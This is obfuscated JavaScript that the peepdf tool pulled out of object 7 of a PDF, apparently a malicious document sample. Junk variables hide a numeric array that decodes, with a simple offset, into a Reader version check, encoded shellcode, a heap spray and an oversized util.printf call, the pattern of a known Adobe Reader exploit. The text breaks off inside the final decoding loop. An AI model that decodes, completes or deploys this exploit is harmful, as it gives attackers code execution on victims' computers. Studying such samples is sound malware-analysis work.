// peepdf comment: Javascript code located in object 7 (version 0)

var dglnu = 'dglnu' + 'dglnu';
abgkz = 63483;
fgoqx = true;
klps = '';
clmqu = 'clmqu' + 'clmqu';
bfio = false;
bghjor = 'bghjor' + 'bghjor';
acuvwx = "";
gqtw = 18658;
ilrx = 52943;
ehlotx = false;
ehijou = 35096;
bkloru = "bkloru" + "bkloru";
ijxz = 32261;
efoqv = "efoqv" + "efoqv";
cijmn = "cijmn";
acekny = "acekny" + "acekny";
dgkmpw = 'dgkmpw' + 'dgkmpw';

function fjps() {
    return 'fjps';
};
fgjxy = "fgjxy";
cglxy = '';
betvwy = '';
gjwxy = 0;
gqvyz = 61977;
afjo = '';
afit = 55718 + 55718;
adlxy = "";
aoqwy = "aoqwy";

function deinpx() {
    return 'deinpx';
};
hilmrz = '';
egilz = 0;
lnotxz = 0;
agprs = 24849 + 24849;
covz = 0;
bhov = "";
ghlmuz = 0;
abdjmq = "abdjmq" + "abdjmq";
afop = false;
bdev = 'bdev' + 'bdev';
filnsw = false;
ilptw = "";

function jmrsv() {
    return 'jmrsv';
};
imuy = "imuy";
cflo = "";
aboryz = 0;
ehiort = "ehiort";

function florsv() {
    return 'florsv';
};
bgkmnq = 5271 + 5271;
cktz = 33079;
hptx = 0;
enrstw = "";
bkvy = 3326 + 3326;
bfkn = 'bfkn' + 'bfkn';
bdfjp = 0;

function prstuw() {
    return 'prstuw';
};
bfloz = "bfloz" + "bfloz";

function agkuw() {
    return 'agkuw';
};
jlnp = 12158 + 12158;
blnost = 3344 + 3344;
gimr = "gimr" + "gimr";

function iknqsu() {
    return 'iknqsu';
};
gijrvx = "gijrvx" + "gijrvx";
gikop = "gikop";
ikwx = 'ikwx' + 'ikwx';
acjmny = false;
cnouyz = 10295 + 10295;

function hijlxz() {
    return 'hijlxz';
};
gjnotx = "gjnotx";
bijmst = true;

function bhlsu() {
    return 'bhlsu';
};
adhioq = "";
dehmrz = 0;
hjltwx = 'hjltwx' + 'hjltwx';

function djlsx() {
    return 'djlsx';
};
fltx = 50354 + 50354;
gtuvx = true;
gjmz = false;
defhoy = true;
var cghorv = "cghorv" + "cghorv",
    agkqtv = '',
    borux = "borux" + "borux",
    gjopvz = '',
    ehilru = 47270 + 47270,
    bdgtuz = app,
    hmnz = String,
    eloqsy = 0,
    gjluwx = [168, 147, 164, 82, 154, 161, 151, 138, 166, 99, 160, 130, 106, 156, 82, 111, 82, 147, 162, 162, 96, 168, 155, 151, 169, 151, 164, 136, 151, 164, 165, 155, 161, 160, 96, 166, 161, 133, 166, 164, 155, 160, 153, 90, 91, 109, 154, 161, 151, 138, 166, 99, 160, 130, 106, 156, 82, 111, 82, 154, 161, 151, 138, 166, 99, 160, 130, 106, 156, 96, 164, 151, 162, 158, 147, 149, 151, 90, 97, 142, 118, 97, 153, 94, 84, 84, 91, 109, 155, 152, 90, 154, 161, 151, 138, 166, 99, 160, 130, 106, 156, 96, 149, 154, 147, 164, 115, 166, 90, 98, 91, 82, 111, 111, 82, 84, 106, 84, 82, 88, 88, 82, 154, 161, 151, 138, 166, 99, 160, 130, 106, 156, 96, 149, 154, 147, 164, 115, 166, 90, 99, 91, 82, 110, 111, 82, 84, 99, 84, 82, 88, 88, 82, 154, 161, 151, 138, 166, 99, 160, 130, 106, 156, 96, 149, 154, 147, 164, 115, 166, 90, 100, 91, 82, 110, 111, 82, 84, 100, 84, 91, 173, 152, 133, 159, 118, 123, 166, 133, 103, 105, 122, 82, 111, 82, 167, 160, 151, 165, 149, 147, 162, 151, 90, 84, 87, 167, 103, 101, 103, 98, 87, 167, 103, 84, 82, 93, 82, 84, 100, 103, 99, 87, 167, 103, 105, 103, 104, 84, 82, 93, 82, 84, 87, 167, 107, 149, 103, 103, 87, 167, 98, 84, 82, 93, 82, 84, 98, 151, 106, 87, 167, 98, 98, 98, 98, 84, 82, 93, 82, 84, 87, 167, 103, 150, 98, 98, 87, 167, 151, 84, 82, 93, 82, 84, 150, 106, 101, 87, 167, 101, 99, 98, 150, 84, 82, 93, 82, 84, 87, 167, 104, 102, 149, 98, 87, 167, 102, 84, 82, 93, 82, 84, 98, 98, 101, 87, 167, 105, 106, 101, 98, 84, 82, 93, 82, 84, 87, 167, 106, 148, 98, 149, 87, 167, 98, 84, 82, 93, 82, 84, 149, 102, 98, 87, 167, 105, 98, 106, 148, 84, 82, 93, 82, 84, 87, 167, 147, 150, 99, 149, 87, 167, 102, 84, 82, 93, 82, 84, 98, 106, 148, 87, 167, 151, 148, 98, 106, 84, 82, 93, 82, 84, 87, 167, 106, 148, 98, 107, 87, 167, 101, 84, 82, 93, 82, 84, 102, 102, 98, 87, 167, 102, 98, 106, 150, 84, 82, 93, 82, 84, 87, 167, 106, 148, 105, 149, 87, 167, 101, 84, 82, 93, 82, 84, 149, 102, 98, 87, 167, 103, 105, 103, 104, 84, 82, 93, 82, 84, 87, 167, 103, 151, 148, 151, 87, 167, 98, 84, 82, 93, 82, 84, 98, 98, 99, 87, 167, 98, 99, 98, 98, 84, 82, 93, 82, 84, 87, 167, 148, 152, 151, 151, 87, 167, 98, 84, 82, 93, 82, 84, 99, 102, 151, 87, 167, 98, 98, 98, 98, 84, 82, 93, 82, 84, 87, 167, 151, 152, 98, 99, 87, 167, 150, 84, 82, 93, 82, 84, 104, 151, 106, 87, 167, 98, 98, 98, 99, 84, 82, 93, 82, 84, 87, 167, 103, 152, 98, 98, 87, 167, 106, 84, 82, 93, 82, 84, 107, 103, 151, 87, 167, 106, 99, 151, 147, 84, 82, 93, 82, 84, 87, 167, 103, 151, 149, 100, 87, 167, 98, 84, 82, 93, 82, 84, 98, 98, 99, 87, 167, 103, 100, 98, 98, 84, 82, 93, 82, 84, 87, 167, 106, 98, 104, 106, 87, 167, 98, 84, 82, 93, 82, 84, 98, 98, 98, 87, 167, 152, 152, 98, 98, 84, 82, 93, 82, 84, 87, 167, 102, 151, 107, 103, 87, 167, 98, 84, 82, 93, 82, 84, 98, 98, 99, 87, 167, 106, 107, 98, 98, 84, 82, 93, 82, 84, 87, 167, 106, 99, 151, 147, 87, 167, 103, 84, 82, 93, 82, 84, 151, 149, 100, 87, 167, 98, 98, 98, 99, 84, 82, 93, 82, 84, 87, 167, 101, 99, 98, 98, 87, 167, 98, 84, 82, 93, 82, 84, 99, 152, 104, 87, 167, 106, 147, 149, 100, 84, 82, 93, 82, 84, 87, 167, 101, 103, 107, 149, 87, 167, 98, 84, 82, 93, 82, 84, 100, 104, 101, 87, 167, 98, 98, 98, 98, 84, 82, 93, 82, 84, 87, 167, 152, 148, 106, 98, 87, 167, 105, 84, 82, 93, 82, 84, 102, 98, 98, 87, 167, 106, 106, 98, 104, 84, 82, 93, 82, 84, 87, 167, 101, 100, 99, 149, 87, 167, 151, 84, 82, 93, 82, 84, 148, 102, 104, 87, 167, 149, 104, 151, 151, 84, 82, 93, 82, 84, 87, 167, 101, 100, 98, 102, 87, 167, 106, 84, 82, 93, 82, 84, 107, 98, 98, 87, 167, 106, 99, 151, 147, 84, 82, 93, 82, 84, 87, 167, 102, 103, 149, 100, 87, 167, 98, 84, 82, 93, 82, 84, 98, 98, 100, 87, 167, 103, 100, 98, 98, 84, 82, 93, 82, 84, 87, 167, 107, 103, 152, 152, 87, 167, 98, 84, 82, 93, 82, 84, 99, 103, 100, 87, 167, 98, 98, 98, 98, 84, 82, 93, 82, 84, 87, 167, 151, 147, 106, 107, 87, 167, 149, 84, 82, 93, 82, 84, 100, 106, 99, 87, 167, 98, 100, 103, 98, 84, 82, 93, 82, 84, 87, 167, 98, 98, 98, 98, 87, 167, 103, 84, 82, 93, 82, 84, 98, 103, 100, 87, 167, 107, 103, 152, 152, 84, 82, 93, 82, 84, 87, 167, 98, 99, 103, 104, 87, 167, 98, 84, 82, 93, 82, 84, 98, 98, 98, 87, 167, 98, 98, 104, 147, 84, 82, 93, 82, 84, 87, 167, 98, 98, 104, 147, 87, 167, 151, 84, 82, 93, 82, 84, 147, 106, 107, 87, 167, 149, 100, 106, 99, 84, 82, 93, 82, 84, 87, 167, 98, 99, 103, 151, 87, 167, 98, 84, 82, 93, 82, 84, 98, 98, 98, 87, 167, 106, 107, 103, 100, 84, 82, 93, 82, 84, 87, 167, 106, 99, 151, 147, 87, 167, 105, 84, 82, 93, 82, 84, 106, 149, 100, 87, 167, 98, 98, 98, 100, 84, 82, 93, 82, 84, 87, 167, 103, 100, 98, 98, 87, 167, 98, 84, 82, 93, 82, 84, 98, 104, 147, 87, 167, 150, 98, 152, 152, 84, 82, 93, 82, 84, 87, 167, 98, 103, 104, 147, 87, 167, 151, 84, 82, 93, 82, 84, 147, 106, 107, 87, 167, 149, 100, 106, 99, 84, 82, 93, 82, 84, 87, 167, 98, 99, 103, 151, 87, 167, 98, 84, 82, 93, 82, 84, 98, 98, 98, 87, 167, 152, 152, 103, 100, 84, 82, 93, 82, 84, 87, 167, 103, 147, 107, 103, 87, 167, 98, 84, 82, 93, 82, 84, 98, 98, 99, 87, 167, 106, 107, 98, 98, 84, 82, 93, 82, 84, 87, 167, 106, 99, 151, 147, 87, 167, 103, 84, 82, 93, 82, 84, 151, 149, 100, 87, 167, 98, 98, 98, 99, 84, 82, 93, 82, 84, 87, 167, 103, 100, 98, 98, 87, 167, 106, 84, 82, 93, 82, 84, 98, 104, 106, 87, 167, 98, 98, 98, 98, 84, 82, 93, 82, 84, 87, 167, 152, 152, 98, 98, 87, 167, 102, 84, 82, 93, 82, 84, 151, 107, 103, 87, 167, 98, 98, 98, 99, 84, 82, 93, 82, 84, 87, 167, 106, 107, 98, 98, 87, 167, 106, 84, 82, 93, 82, 84, 99, 151, 147, 87, 167, 103, 151, 149, 100, 84, 82, 93, 82, 84, 87, 167, 98, 98, 98, 99, 87, 167, 101, 84, 82, 93, 82, 84, 99, 98, 98, 87, 167, 98, 99, 152, 104, 84, 82, 93, 82, 84, 87, 167, 106, 147, 149, 100, 87, 167, 101, 84, 82, 93, 82, 84, 103, 107, 149, 87, 167, 98, 100, 104, 151, 84, 82, 93, 82, 84, 87, 167, 98, 98, 98, 98, 87, 167, 152, 84, 82, 93, 82, 84, 148, 106, 98, 87, 167, 105, 102, 98, 98, 84, 82, 93, 82, 84, 87, 167, 106, 106, 98, 104, 87, 167, 101, 84, 82, 93, 82, 84, 100, 99, 149, 87, 167, 151, 148, 102, 104, 84, 82, 93, 82, 84, 87, 167, 149, 104, 151, 151, 87, 167, 101, 84, 82, 93, 82, 84, 100, 98, 102, 87, 167, 106, 107, 98, 98, 84, 82, 93, 82, 84, 87, 167, 106, 99, 151, 147, 87, 167, 102, 84, 82, 93, 82, 84, 103, 149, 100, 87, 167, 98, 98, 98, 100, 84, 82, 93, 82, 84, 87, 167, 103, 100, 98, 98, 87, 167, 107, 84, 82, 93, 82, 84, 103, 152, 152, 87, 167, 98, 99, 103, 100, 84, 82, 93, 82, 84, 87, 167, 98, 98, 98, 98, 87, 167, 151, 84, 82, 93, 82, 84, 147, 106, 107, 87, 167, 149, 100, 106, 99, 84, 82, 93, 82, 84, 87, 167, 98, 100, 103, 98, 87, 167, 98, 84, 82, 93, 82, 84, 98, 98, 98, 87, 167, 103, 98, 103, 100, 84, 82, 93, 82, 84, 87, 167, 107, 103, 152, 152, 87, 167, 98, 84, 82, 93, 82, 84, 99, 103, 104, 87, 167, 98, 98, 98, 98, 84, 82, 93, 82, 84, 87, 167, 98, 98, 104, 147, 87, 167, 98, 84, 82, 93, 82, 84, 98, 104, 147, 87, 167, 151, 147, 106, 107, 84, 82, 93, 82, 84, 87, 167, 149, 100, 106, 99, 87, 167, 98, 84, 82, 93, 82, 84, 99, 103, 151, 87, 167, 98, 98, 98, 98, 84, 82, 93, 82, 84, 87, 167, 106, 107, 103, 100, 87, 167, 106, 84, 82, 93, 82, 84, 99, 151, 147, 87, 167, 147, 104, 149, 100, 84, 82, 93, 82, 84, 87, 167, 98, 98, 98, 100, 87, 167, 103, 84, 82, 93, 82, 84, 100, 98, 98, 87, 167, 98, 98, 104, 147, 84, 82, 93, 82, 84, 87, 167, 150, 98, 152, 152, 87, 167, 98, 84, 82, 93, 82, 84, 103, 104, 147, 87, 167, 151, 147, 106, 107, 84, 82, 93, 82, 84, 87, 167, 149, 100, 106, 99, 87, 167, 98, 84, 82, 93, 82, 84, 99, 103, 151, 87, 167, 98, 98, 98, 98, 84, 82, 93, 82, 84, 87, 167, 152, 152, 103, 100, 87, 167, 103, 84, 82, 93, 82, 84, 147, 107, 103, 87, 167, 98, 98, 98, 99, 84, 82, 93, 82, 84, 87, 167, 107, 150, 98, 98, 87, 167, 103, 84, 82, 93, 82, 84, 152, 103, 150, 87, 167, 103, 147, 103, 151, 84, 82, 93, 82, 84, 87, 167, 103, 148, 103, 107, 87, 167, 149, 84, 82, 93, 82, 84, 101, 103, 106, 87, 167, 98, 98, 98, 98, 84, 82, 93, 82, 84, 87, 167, 98, 98, 98, 98, 87, 167, 98, 84, 82, 93, 82, 84, 98, 98, 98, 87, 167, 98, 98, 98, 98, 84, 82, 93, 82, 84, 87, 167, 98, 98, 98, 98, 87, 167, 98, 84, 82, 93, 82, 84, 98, 98, 98, 87, 167, 98, 98, 98, 98, 84, 82, 93, 82, 84, 87, 167, 98, 98, 98, 98, 87, 167, 104, 84, 82, 93, 82, 84, 103, 102, 105, 87, 167, 103, 102, 105, 102, 84, 82, 93, 82, 84, 87, 167, 104, 150, 104, 103, 87, 167, 103, 84, 82, 93, 82, 84, 98, 105, 98, 87, 167, 105, 102, 104, 99, 84, 82, 93, 82, 84, 87, 167, 102, 99, 104, 106, 87, 167, 102, 84, 82, 93, 82, 84, 149, 98, 98, 87, 167, 104, 99, 104, 152, 84, 82, 93, 82, 84, 87, 167, 102, 149, 104, 102, 87, 167, 104, 84, 82, 93, 82, 84, 100, 104, 107, 87, 167, 104, 99, 105, 100, 84, 82, 93, 82, 84, 87, 167, 105, 107, 105, 100, 87, 167, 98, 84, 82, 93, 82, 84, 98, 102, 99, 87, 167, 104, 103, 102, 105, 84, 82, 93, 82, 84, 87, 167, 103, 98, 105, 102, 87, 167, 104, 84, 82, 93, 82, 84, 152, 105, 100, 87, 167, 102, 99, 104, 101, 84, 82, 93, 82, 84, 87, 167, 104, 102, 104, 102, 87, 167, 104, 84, 82, 93, 82, 84, 103, 105, 100, 87, 167, 105, 101, 105, 101, 84, 82, 93, 82, 84, 87, 167, 103, 105, 98, 98, 87, 167, 104, 84, 82, 93, 82, 84, 151, 104, 107, 87, 167, 105, 106, 102, 103, 84, 82, 93, 82, 84, 87, 167, 104, 101, 104, 103, 87, 167, 148, 84, 82, 93, 82, 84, 148, 98, 98, 87, 167, 152, 100, 106, 107, 84, 82, 93, 82, 84, 87, 167, 152, 105, 106, 107, 87, 167, 149, 84, 82, 93, 82, 84, 98, 101, 98, 87, 167, 105, 103, 147, 151, 84, 82, 93, 82, 84, 87, 167, 100, 107, 152, 150, 87, 167, 106, 84, 82, 93, 82, 84, 107, 152, 105, 87, 167, 101, 99, 152, 107, 84, 82, 93, 82, 84, 87, 167, 148, 151, 149, 98, 87, 167, 98, 84, 82, 93, 82, 84, 98, 101, 149, 87, 167, 98, 98, 98, 98, 84, 82, 93, 82, 84, 87, 167, 148, 103, 98, 101, 87, 167, 98, 84, 82, 93, 82, 84, 100, 99, 148, 87, 167, 98, 98, 98, 98, 84, 82, 93, 82, 84, 87, 167, 147, 150, 104, 104, 87, 167, 106, 84, 82, 93, 82, 84, 103, 98, 101, 87, 167, 98, 100, 99, 148, 84, 82, 93, 82, 84, 87, 167, 98, 98, 98, 98, 87, 167, 105, 84, 82, 93, 82, 84, 98, 106, 148, 87, 167, 106, 101, 105, 106, 84, 82, 93, 82, 84, 87, 167, 99, 149, 149, 104, 87, 167, 148, 84, 82, 93, 82, 84, 103, 98, 101, 87, 167, 98, 100, 99, 148, 84, 82, 93, 82, 84, 87, 167, 98, 98, 98, 98, 87, 167, 148, 84, 82, 93, 82, 84, 150, 106, 150, 87, 167, 98, 100, 99, 152, 84, 82, 93, 82, 84, 87, 167, 98, 98, 98, 98, 87, 167, 98, 84, 82, 93, 82, 84, 101, 147, 150, 87, 167, 99, 148, 106, 103, 84, 82, 93, 82, 84, 87, 167, 98, 98, 98, 100, 87, 167, 147, 84, 82, 93, 82, 84, 148, 98, 98, 87, 167, 98, 101, 147, 150, 84, 82, 93, 82, 84, 87, 167, 99, 148, 106, 103, 87, 167, 98, 84, 82, 93, 82, 84, 98, 98, 100, 87, 167, 103, 98, 98, 98, 84, 82, 93, 82, 84, 87, 167, 147, 150, 147, 148, 87, 167, 106, 84, 82, 93, 82, 84, 103, 98, 101, 87, 167, 98, 100, 99, 148, 84, 82, 93, 82, 84, 87, 167, 98, 98, 98, 98, 87, 167, 103, 84, 82, 93, 82, 84, 151, 147, 148, 87, 167, 150, 148, 101, 99, 84, 82, 93, 82, 84, 87, 167, 103, 104, 147, 150, 87, 167, 106, 84, 82, 93, 82, 84, 103, 98, 101, 87, 167, 98, 100, 99, 148, 84, 82, 93, 82, 84, 87, 167, 98, 98, 98, 98, 87, 167, 149, 84, 82, 93, 82, 84, 104, 106, 107, 87, 167, 150, 105, 106, 107, 84, 82, 93, 82, 84, 87, 167, 152, 149, 103, 99, 87, 167, 147, 84, 82, 93, 82, 84, 104, 152, 101, 87, 167, 105, 102, 103, 107, 84, 82, 93, 82, 84, 87, 167, 103, 151, 98, 102, 87, 167, 151, 84, 82, 93, 82, 84, 148, 102, 101, 87, 167, 103, 151, 151, 107, 84, 82, 93, 82, 84, 87, 167, 150, 99, 107, 101, 87, 167, 98, 84, 82, 93, 82, 84, 101, 151, 98, 87, 167, 100, 105, 106, 103, 84, 82, 93, 82, 84, 87, 167, 98, 98, 98, 100, 87, 167, 101, 84, 82, 93, 82, 84, 99, 98, 98, 87, 167, 107, 104, 152, 104, 84, 82, 93, 82, 84, 87, 167, 147, 150, 104, 104, 87, 167, 151, 84, 82, 93, 82, 84, 98, 149, 99, 87, 167, 98, 101, 98, 100, 84, 82, 93, 82, 84, 87, 167, 99, 152, 106, 103, 87, 167, 98, 84, 82, 93, 82, 84, 98, 98, 100, 87, 167, 106, 107, 98, 98, 84, 82, 93, 82, 84, 87, 167, 147, 150, 149, 104, 87, 167, 106, 84, 82, 93, 82, 84, 103, 98, 101, 87, 167, 98, 100, 99, 148, 84, 82, 93, 82, 84, 87, 167, 98, 98, 98, 98, 87, 167, 151, 84, 82, 93, 82, 84, 148, 149, 101, 87, 167, 98, 98, 99, 98, 84, 82, 93, 82, 84, 87, 167, 98, 98, 98, 98, 87, 167, 98, 84, 82, 93, 82, 84, 98, 98, 98, 87, 167, 98, 98, 98, 98, 84, 82, 93, 82, 84, 87, 167, 98, 98, 98, 98, 87, 167, 98, 84, 82, 93, 82, 84, 98, 98, 98, 87, 167, 98, 98, 98, 98, 84, 82, 93, 82, 84, 87, 167, 98, 98, 98, 98, 87, 167, 106, 84, 82, 93, 82, 84, 107, 98, 98, 87, 167, 99, 148, 106, 103, 84, 82, 93, 82, 84, 87, 167, 98, 98, 98, 100, 87, 167, 103, 84, 82, 93, 82, 84, 104, 98, 98, 87, 167, 151, 106, 103, 105, 84, 82, 93, 82, 84, 87, 167, 152, 152, 103, 106, 87, 167, 152, 84, 82, 93, 82, 84, 152, 152, 152, 87, 167, 103, 151, 103, 152, 84, 82, 93, 82, 84, 87, 167, 98, 99, 147, 148, 87, 167, 106, 84, 82, 93, 82, 84, 98, 149, 151, 87, 167, 148, 148, 101, 151, 84, 82, 93, 82, 84, 87, 167, 98, 100, 105, 102, 87, 167, 151, 84, 82, 93, 82, 84, 150, 151, 148, 87, 167, 103, 103, 149, 101, 84, 82, 93, 82, 84, 87, 167, 102, 149, 103, 100, 87, 167, 102, 84, 82, 93, 82, 84, 152, 102, 150, 87, 167, 100, 151, 102, 151, 84, 82, 93, 82, 84, 87, 167, 102, 149, 102, 102, 87, 167, 98, 84, 82, 93, 82, 84, 98, 102, 149, 87, 167, 103, 100, 103, 103, 84, 82, 93, 82, 84, 87, 167, 102, 102, 102, 149, 87, 167, 105, 84, 82, 93, 82, 84, 105, 104, 152, 87, 167, 104, 149, 104, 151, 84, 82, 93, 82, 84, 87, 167, 104, 99, 104, 152, 87, 167, 103, 84, 82, 93, 82, 84, 102, 104, 102, 87, 167, 102, 104, 104, 152, 84, 82, 93, 82, 84, 87, 167, 104, 149, 104, 107, 87, 167, 102, 84, 82, 93, 82, 84, 99, 104, 103, 87, 167, 105, 98, 98, 98, 84, 82, 93, 82, 84, 87, 167, 104, 104, 104, 102, 87, 167, 105, 84, 82, 93, 82, 84, 98, 105, 103, 87, 167, 100, 151, 104, 102, 84, 82, 93, 82, 84, 87, 167, 105, 106, 104, 103, 87, 167, 98, 84, 82, 93, 82, 84, 98, 104, 103, 87, 167, 105, 100, 104, 101, 84, 82, 93, 82, 84, 87, 167, 105, 101, 104, 99, 87, 167, 100, 84, 82, 93, 82, 84, 151, 104, 106, 87, 167, 104, 106, 105, 98, 84, 82, 93, 82, 84, 87, 167, 98, 98, 105, 98, 87, 167, 105, 84, 82, 93, 82, 84, 102, 104, 106, 87, 167, 105, 98, 105, 102, 84, 82, 93, 82, 84, 87, 167, 100, 152, 101, 147, 87, 167, 105, 84, 82, 93, 82, 84, 101, 100, 152, 87, 167, 105, 103, 104, 152, 84, 82, 93, 82, 84, 87, 167, 104, 150, 105, 147, 87, 167, 105, 84, 82, 93, 82, 84, 104, 104, 152, 87, 167, 104, 101, 100, 151, 84, 82, 93, 82, 84, 87, 167, 100, 152, 104, 151, 87, 167, 104, 84, 82, 93, 82, 84, 107, 104, 102, 87, 167, 105, 98, 104, 104, 84, 82, 93, 82, 84, 87, 167, 104, 101, 104, 99, 87, 167, 100, 84, 82, 93, 82, 84, 152, 104, 148, 87, 167, 104, 152, 104, 149, 84, 82, 93, 82, 84, 87, 167, 104, 102, 104, 99, 87, 167, 105, 84, 82, 93, 82, 84, 98, 100, 151, 87, 167, 105, 98, 104, 106, 84, 82, 93, 82, 84, 87, 167, 104, 107, 101, 152, 87, 167, 101, 84, 82, 93, 82, 84, 150, 104, 102, 87, 167, 98, 98, 101, 103, 84, 82, 93, 82, 84, 87, 167, 107, 98, 98, 98, 84, 82, 93, 82, 84, 84, 91, 109, 168, 147, 164, 82, 148, 140, 158, 118, 158, 154, 99, 147, 103, 82, 111, 82, 167, 160, 151, 165, 149, 147, 162, 151, 90, 84, 87, 167, 98, 147, 98, 147, 84, 82, 93, 82, 84, 87, 167, 98, 147, 98, 147, 84, 82, 93, 82, 84, 84, 91, 109, 168, 147, 164, 82, 157, 115, 170, 128, 157, 164, 121, 135, 157, 82, 111, 82, 100, 98, 82, 93, 82, 152, 133, 159, 118, 123, 166, 133, 103, 105, 122, 96, 158, 151, 160, 153, 166, 154, 109, 169, 154, 155, 158, 151, 90, 148, 140, 158, 118, 158, 154, 99, 147, 103, 96, 158, 151, 160, 153, 166, 154, 82, 110, 82, 157, 115, 170, 128, 157, 164, 121, 135, 157, 91, 82, 148, 140, 158, 118, 158, 154, 99, 147, 103, 82, 93, 111, 82, 148, 140, 158, 118, 158, 154, 99, 147, 103, 109, 168, 147, 164, 82, 150, 152, 115, 170, 103, 120, 159, 116, 156, 168, 82, 111, 82, 148, 140, 158, 118, 158, 154, 99, 147, 103, 96, 165, 167, 148, 165, 166, 164, 155, 160, 153, 90, 98, 94, 82, 157, 115, 170, 128, 157, 164, 121, 135, 157, 91, 109, 168, 147, 164, 82, 150, 123, 132, 116, 151, 128, 154, 121, 154, 82, 111, 82, 148, 140, 158, 118, 158, 154, 99, 147, 103, 96, 165, 167, 148, 165, 166, 164, 155, 160, 153, 90, 98, 94, 82, 148, 140, 158, 118, 158, 154, 99, 147, 103, 96, 158, 151, 160, 153, 166, 154, 82, 95, 82, 157, 115, 170, 128, 157, 164, 121, 135, 157, 91, 109, 169, 154, 155, 158, 151, 90, 150, 123, 132, 116, 151, 128, 154, 121, 154, 96, 158, 151, 160, 153, 166, 154, 82, 93, 82, 157, 115, 170, 128, 157, 164, 121, 135, 157, 82, 110, 82, 98, 170, 104, 98, 98, 98, 98, 91, 82, 150, 123, 132, 116, 151, 128, 154, 121, 154, 82, 111, 82, 150, 123, 132, 116, 151, 128, 154, 121, 154, 82, 93, 82, 150, 123, 132, 116, 151, 128, 154, 121, 154, 82, 93, 82, 150, 152, 115, 170, 103, 120, 159, 116, 156, 168, 109, 168, 147, 164, 82, 162, 168, 170, 151, 135, 150, 135, 168, 82, 111, 82, 160, 151, 169, 82, 115, 164, 164, 147, 171, 90, 91, 109, 152, 161, 164, 90, 155, 148, 169, 162, 134, 170, 103, 164, 101, 82, 111, 82, 98, 109, 82, 155, 148, 169, 162, 134, 170, 103, 164, 101, 82, 110, 82, 99, 100, 98, 98, 109, 82, 155, 148, 169, 162, 134, 170, 103, 164, 101, 93, 93, 91, 173, 162, 168, 170, 151, 135, 150, 135, 168, 141, 155, 148, 169, 162, 134, 170, 103, 164, 101, 143, 82, 111, 82, 150, 123, 132, 116, 151, 128, 154, 121, 154, 82, 93, 82, 152, 133, 159, 118, 123, 166, 133, 103, 105, 122, 175, 168, 147, 164, 82, 154, 101, 115, 140, 165, 132, 123, 132, 82, 111, 82, 84, 99, 100, 107, 107, 107, 84, 82, 93, 82, 84, 107, 107, 107, 107, 107, 84, 82, 93, 82, 84, 107, 107, 107, 107, 107, 84, 82, 93, 82, 84, 107, 107, 107, 107, 107, 84, 82, 93, 82, 84, 106, 106, 106, 106, 106, 84, 82, 93, 82, 84, 106, 106, 106, 106, 106, 84, 82, 93, 82, 84, 106, 106, 106, 106, 106, 84, 82, 93, 82, 84, 106, 106, 106, 106, 106, 84, 82, 93, 82, 84, 106, 106, 106, 106, 106, 84, 82, 93, 82, 84, 106, 106, 106, 106, 106, 84, 82, 93, 82, 84, 106, 106, 106, 106, 106, 84, 82, 93, 82, 84, 106, 106, 106, 106, 106, 84, 82, 93, 82, 84, 106, 106, 106, 106, 106, 84, 82, 93, 82, 84, 106, 106, 106, 106, 106, 84, 82, 93, 82, 84, 106, 106, 106, 106, 106, 84, 82, 93, 82, 84, 106, 106, 106, 106, 106, 84, 82, 93, 82, 84, 106, 106, 106, 106, 106, 84, 82, 93, 82, 84, 106, 106, 106, 106, 106, 84, 82, 93, 82, 84, 106, 106, 106, 106, 106, 84, 82, 93, 82, 84, 106, 106, 106, 106, 106, 84, 82, 93, 82, 84, 106, 106, 106, 106, 106, 84, 82, 93, 82, 84, 106, 106, 106, 106, 106, 84, 82, 93, 82, 84, 106, 106, 106, 106, 106, 84, 82, 93, 82, 84, 106, 106, 106, 106, 106, 84, 82, 93, 82, 84, 106, 106, 106, 106, 106, 84, 82, 93, 82, 84, 106, 106, 106, 106, 106, 84, 82, 93, 82, 84, 106, 106, 106, 106, 106, 84, 82, 93, 82, 84, 106, 106, 106, 106, 106, 84, 82, 93, 82, 84, 106, 106, 106, 106, 106, 84, 82, 93, 82, 84, 106, 106, 106, 106, 106, 84, 82, 93, 82, 84, 106, 106, 106, 106, 106, 84, 82, 93, 82, 84, 106, 106, 106, 106, 106, 84, 82, 93, 82, 84, 106, 106, 106, 106, 106, 84, 82, 93, 82, 84, 106, 106, 106, 106, 106, 84, 82, 93, 82, 84, 106, 106, 106, 106, 106, 84, 82, 93, 82, 84, 106, 106, 106, 106, 106, 84, 82, 93, 82, 84, 106, 106, 106, 106, 106, 84, 82, 93, 82, 84, 106, 106, 106, 106, 106, 84, 82, 93, 82, 84, 106, 106, 106, 106, 106, 84, 82, 93, 82, 84, 106, 106, 106, 106, 106, 84, 82, 93, 82, 84, 106, 106, 106, 106, 106, 84, 82, 93, 82, 84, 106, 106, 106, 106, 106, 84, 82, 93, 82, 84, 106, 106, 106, 106, 106, 84, 82, 93, 82, 84, 106, 106, 106, 106, 106, 84, 82, 93, 82, 84, 106, 106, 106, 106, 106, 84, 82, 93, 82, 84, 106, 106, 106, 106, 106, 84, 82, 93, 82, 84, 106, 106, 106, 106, 106, 84, 82, 93, 82, 84, 106, 106, 106, 106, 106, 84, 82, 93, 82, 84, 106, 106, 106, 106, 106, 84, 82, 93, 82, 84, 106, 106, 106, 106, 106, 84, 82, 93, 82, 84, 106, 106, 106, 106, 106, 84, 82, 93, 82, 84, 106, 106, 106, 106, 106, 84, 82, 93, 82, 84, 106, 106, 106, 106, 106, 84, 82, 93, 82, 84, 106, 106, 106, 106, 106, 84, 82, 93, 82, 84, 106, 106, 106, 106, 106, 84, 82, 93, 82, 84, 106, 106, 106, 106, 106, 84, 82, 93, 82, 84, 106, 106, 106, 106, 106, 84, 82, 93, 82, 84, 106, 106, 106, 106, 106, 84, 82, 93, 82, 84, 106, 106, 106, 106, 106, 84, 82, 93, 82, 84, 106, 84, 82, 93, 82, 84, 84, 109, 167, 166, 155, 158, 96, 162, 164, 155, 160, 166, 152, 90, 84, 87, 102, 103, 98, 98, 98, 152, 84, 94, 82, 154, 101, 115, 140, 165, 132, 123, 132, 91, 109, 175, 151, 158, 165, 151, 173, 168, 147, 164, 82, 156, 156, 101, 137, 121, 151, 105, 134, 164, 82, 111, 82, 160, 151, 169, 82, 115, 164, 164, 147, 171, 90, 91, 109, 152, 167, 160, 149, 166, 155, 161, 160, 82, 157, 138, 128, 126, 160, 167, 147, 132, 128, 90, 150, 129, 136, 129, 152, 102, 104, 121, 160, 94, 82, 150, 150, 169, 125, 103, 170, 106, 121, 91, 173, 169, 154, 155, 158, 151, 90, 150, 129, 136, 129, 152, 102, 104, 121, 160, 96, 158, 151, 160, 153, 166, 154, 82, 92, 82, 100, 82, 110, 82, 150, 150, 169, 125, 103, 170, 106, 121, 91, 173, 150, 129, 136, 129, 152, 102, 104, 121, 160, 